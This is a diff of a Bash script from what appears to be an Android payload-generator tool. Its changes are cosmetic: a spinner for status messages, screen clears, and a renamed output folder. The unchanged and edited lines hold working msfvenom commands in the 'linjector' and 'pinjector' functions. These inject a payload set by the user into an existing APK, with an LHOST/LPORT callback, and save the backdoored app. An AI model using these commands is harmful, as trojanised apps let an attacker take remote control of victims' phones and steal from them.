@@ -303,7 +303,9 @@ create_internal_payload() {
         sleep 1s
     fi
     
-    echo -e "${GREEN}[+] APK Payload Generated Successfully With Name $payload_name.apk To Path >> $pay_path (^_^) ${NC}"
+    echo -e ${GREEN} "" 
+    bar="[+] APK Payload Generated Successfully With Name $payload_name.apk To Path >> $pay_path (^_^) .   "
+    spinlong
     sleep 3s
 }
 
@@ -351,7 +353,9 @@ create_external_payload() {
         sleep 1s
     fi
 
-    echo -e "${GREEN}[+] APK Payload Generated Successfully With Name $payload_name1.apk To Path >> $pay_path1 (^_^) ${NC}"
+    echo -e ${GREEN} "" 
+    bar="[+] APK Payload Generated Successfully With Name $payload_name1.apk To Path >> $pay_path1 (^_^) .   "
+    spinlong
     sleep 3s
 }
 # inject payload to apk file 
@@ -375,16 +379,22 @@ linjector() {
     read -p "Please Enter Path Of APK After Injection : " oliapkpath
     sleep 1s
     echo ''
-    xterm -T " INJECT PAYLOAD In APK FILE " -e msfvenom -x $POIA -p $PAYLOAD LHOST=$lihost LPORT=$liport -a dalvik --platform android R -o $HOME/.GX-Tools/Android-Payload-Generator/Payload/$oiapk.apk 
+    xterm -T " INJECT PAYLOAD In APK FILE " -e msfvenom -x $POIA -p $PAYLOAD LHOST=$lihost LPORT=$liport -a dalvik --platform android R -o $HOME/.GX-Tools/Android-Payload-Generator/Payloads/$oiapk.apk
     sleep 2s
-    mv $HOME/.GX-Tools/Android-Payload-Generator/Payload/$oiapk.apk $oliapkpath
+    mv $HOME/.GX-Tools/Android-Payload-Generator/Payloads/$oiapk.apk $oliapkpath
     sleep 2s
     echo '' 
+    sleep 1s
+    clear
+    echo ''
+    sleep 1s
     echo -e $LGreen '';figlet -c -f slant "Success Injection"
     sleep 1s
     echo ''
     sleep 1s
-    echo -e "${GREEN}[+] Your APK Injected Successfully By Local Payload With Name $oiapk.apk In $oliapkpath Path (^_^) ${NC}"
+    echo -e ${GREEN} "" 
+    bar="[+] Your APK Injected Successfully By Local Payload With Name $oiapk.apk In $oliapkpath Path (^_^) .   "
+    spinlong
     sleep 3s
 }
 pinjector() {
@@ -408,15 +418,22 @@ pinjector() {
     read -p "Please Enter Path Of APK After Injection : " opiapkpath
     sleep 1s
     echo ''
-    xterm -T " INJECT PAYLOAD In APK FILE " -e msfvenom -x $PPOIA -p $PAYLOAD LHOST=$pihost LPORT=$piport -a dalvik --platform android R -o $HOME/.GX-Tools/Android-Payload-Generator/Payload/$opiapk.apk 
-    mv $HOME/.GX-Tools/Android-Payload-Generator/Payload/$opiapk.apk $opiapkpath 
+    xterm -T " INJECT PAYLOAD In APK FILE " -e msfvenom -x $PPOIA -p $PAYLOAD LHOST=$pihost LPORT=$piport -a dalvik --platform android R -o $HOME/.GX-Tools/Android-Payload-Generator/Payloads/$opiapk.apk 
+    sleep 1s
+    mv $HOME/.GX-Tools/Android-Payload-Generator/Payloads/$opiapk.apk $opiapkpath 
     sleep 2s
     echo '' 
+    sleep 1s
+    clear
+    echo ''
+    sleep 1s
     echo -e $LGreen '';figlet -c -f slant "Success Injection"
     sleep 1s
     echo ''
     sleep 1s
-    echo -e "${GREEN}[+] Your APK Injected Successfully By Public Payload With Name $opiapk.apk In $opiapkpath Path (^_^) ${NC}"
+    echo -e ${GREEN} ""
+    bar="[+] Your APK Injected Successfully By Public Payload With Name $opiapk.apk In $opiapkpath Path (^_^) .   "
+    spinlong
     sleep 3s
 }
 injector() { 
